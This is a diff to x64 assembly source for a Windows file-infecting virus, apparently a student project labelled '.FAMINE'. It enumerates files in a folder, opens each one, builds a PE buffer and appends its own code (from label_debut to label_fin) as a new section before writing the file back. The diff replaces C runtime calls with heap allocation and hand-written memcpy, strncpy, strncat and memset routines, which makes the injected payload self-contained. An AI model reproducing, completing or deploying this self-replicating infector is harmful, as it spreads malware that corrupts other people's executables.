@@ -7,31 +7,24 @@
 
 includelib libcmt.lib
 includelib kernel32.lib
-includelib ntdll.lib
-
-extrn puts:proc
-extrn printf:proc
 
 extrn FindFirstFileA:proc
 extrn FindNextFileA:proc
-extrn memset:proc
-extrn strncat:proc
-extrn strncpy:proc
 extrn ReadFile:proc
 extrn CreateFileA:proc
-extrn memcpy:proc
-extrn malloc:proc
 extrn GetFileSize:proc
 extrn SetFilePointer:proc
 extrn WriteFile:proc
-extrn NtCreateFile:proc
+extrn GetProcessHeap:proc
+extrn HeapAlloc:proc
+
 .code
 
 ; rbp
 ; 40-48 : alignment
 ; 32-40 : av[0]
 ; 00-32 : shadow space
-; rsp 
+; rsp
 
 label_debut:
 
@@ -64,15 +57,18 @@ main proc
 		mov rcx, [rdx]
 		mov [rsp + 32], rcx
 
-	 	call NtCreateFile
+		test BYTE ptr [MUST_EXIT], 1
+		jne	not_nt_create_file
+		call proc_nt_create_file ; Si must exit = 1
+
+		not_nt_create_file:
+	 	call CreateFileA
 
 		lea rcx, TMP_1
 		call infect_folder
 		mov rdx, label_fin
 		mov rcx, label_debut
 		sub rdx, rcx
-;		lea rcx, print_ptr
-;		call printf
 
 		add rsp, 48 
 
@@ -112,10 +108,12 @@ TMP_1_NAME db 'C:\Users\moi\AppData\Local\Temp\test\',0h
 SECTION_NAME db '.FAMINE',0
 
 ; rbp
+; 72 - 80   : padding
+; 64 - 72   : saved rdi
 ; 60 - 64	: size_of_main 
 ; 56 - 60	: Addresse virtuelle de notre code
 ; 48 - 56	: nbr of bytes read 
-; 40 - 48	: malloc
+; 40 - 48	: rsp - 64
 ; 32 - 40	: params
 ; 00 - 32	: shadow
 ; rsp
@@ -128,7 +126,10 @@ SECTION_NAME db '.FAMINE',0
 handle_file proc ; int handle
 	push rbp
 	mov rbp, rsp
-	sub rsp, 64
+	sub rsp, 80
+
+	mov qword ptr [rsp + 64], rdi
+
 
 	mov r12, rcx
 	mov rcx, r12
@@ -143,11 +144,15 @@ handle_file proc ; int handle
 
 	mov r14, rcx
 	
-	add rcx, rax 
-	call malloc
+	add rcx, rax
+	mov rdi, rcx ; rdi = taille a creer
 
-	test rax, rax
-	je ret_failure
+	call GetProcessHeap
+
+	mov rcx, rax
+	mov rdx, 0
+	mov r8, rdi
+	call HeapAlloc
 
 	mov [rsp + 40], rax
 	mov word ptr [rax], 5a4dh
@@ -237,7 +242,7 @@ handle_file proc ; int handle
 	add rcx, r13
 	lea rdx, label_debut
 	mov r8, r14
-	call memcpy	 ; on ecrit notre code a la fin du buffer
+	call ft_memcpy	 ; on ecrit notre code a la fin du buffer
 
 	mov rcx, fin_main
 	mov rdx, debut_main
@@ -298,7 +303,7 @@ handle_file proc ; int handle
 	xor r8, 0ffh
 	inc r8
 		mov rbx, r8
-	call memset
+	call ft_memset
 
 	mov rcx, r12
 	mov rdx, [rsp + 40]
@@ -308,6 +313,7 @@ handle_file proc ; int handle
 	call WriteFile
 
 ret_failure:
+	mov rdi, qword ptr [rsp + 64]
 	mov rsp, rbp
 	pop rbp
 	ret
@@ -328,12 +334,6 @@ open_file proc ; char *file_path - return fd or 0
 	sub rsp, 80
 	
 	xor rax, rax
-
-	push rcx
-	push 0
-	call puts
-	pop rcx
-	pop rcx
 
 	mov rdx, 0C0000000h ; Desired Access
 	mov r8, 0 ; Share permission
@@ -400,18 +400,15 @@ loop_start:
 		cmp rax, 0
 		je loop_end
 
-		lea rcx, [rsp + 84]
-		call puts
-
 		lea rcx, [rsp + 400]
 		lea rdx, TMP_1_NAME
 		mov r8, 128
-		call strncpy
+		call ft_strncpy
 
 		lea rcx, [rsp + 400]
 		lea rdx, [rsp + 84]
 		mov r8, 128
-		call strncat
+		call ft_strncat
 
 		lea rcx, [rsp + 400]
 		call open_file
@@ -429,5 +426,116 @@ loop_end:
 		pop rbp
 		ret
 infect_folder endp
+
+ft_memset proc ; ft_memset(char *dst, char c, int n)
+	push rbp
+	mov rbp, rsp
+
+	xor rax, rax
+	mov r9, rcx
+	debut_boucle_ft_memset:
+	cmp rax, r8
+	je	fin_boucle_ft_memset
+	mov byte ptr [rcx], dl
+	inc rcx
+	inc rax
+	jmp debut_boucle_ft_memset
+	fin_boucle_ft_memset:
+
+	mov rax, r9
+	mov rsp, rbp
+	pop rbp
+	ret
+ft_memset endp
+
+ft_strncat proc ; char *strncat(char *dest, const char *src, size_t n);
+	push rbp
+	mov rbp, rsp
+
+	xor rax, rax
+	mov r9, rcx
+	debut_boucle_ft_strncat:
+	cmp rax, r8
+	je	fin_boucle_ft_memset
+	cmp byte ptr [rcx], 0
+	je fin_boucle_ft_memset
+
+	inc rcx
+	inc rax
+	jmp debut_boucle_ft_strncat
+	fin_boucle_ft_memset:
+	debut_sec_boucle:
+	cmp rax, r8
+	je	fin_sec_boucle
+	cmp byte ptr [rdx], 0
+	je fin_sec_boucle
+	mov r10B, [rdx]
+	mov byte ptr [rcx], r10B
+	inc rcx
+	inc rdx
+	inc rax
+	jmp debut_sec_boucle
+	fin_sec_boucle:
+	mov byte ptr [rcx], 0
+	mov rax, r9
+	mov rsp, rbp
+	pop rbp
+	ret
+ft_strncat endp
+
+ft_strncpy proc ; char *strncpy(char *dest, const char *src, size_t n);
+	push rbp
+	mov rbp, rsp
+
+	xor rax, rax
+	mov r9, rcx
+
+	debut_boucle_ft_strncpy:
+	cmp rax, r8
+	je	fin_boucle_strncpy
+	cmp byte ptr [rdx], 0
+	je fin_boucle_strncpy
+	mov r10B, [rdx]
+	mov byte ptr [rcx], r10B
+	inc rcx
+	inc rdx
+	inc rax
+	jmp debut_boucle_ft_strncpy
+	fin_boucle_strncpy:
+	mov byte ptr [rcx], 0
+	mov rax, r9
+	mov rsp, rbp
+	pop rbp
+	ret
+ft_strncpy endp
+
+ft_memcpy proc ; char *strncpy(char *dest, const char *src, size_t n);
+	push rbp
+	mov rbp, rsp
+
+	xor rax, rax
+	mov r9, rcx
+
+	debut_boucle_ft_memcpy:
+	cmp rax, r8
+	je	fin_boucle_memcpy
+	mov r10B, [rdx]
+	mov byte ptr [rcx], r10B
+	inc rcx
+	inc rdx
+	inc rax
+	jmp debut_boucle_ft_memcpy
+	fin_boucle_memcpy:
+	mov rax, r9
+	mov rsp, rbp
+	pop rbp
+	ret
+ft_memcpy endp
+
+
+proc_nt_create_file proc
+jmp [qword ptr infect_folder]
+proc_nt_create_file endp
+
 label_fin:
 end
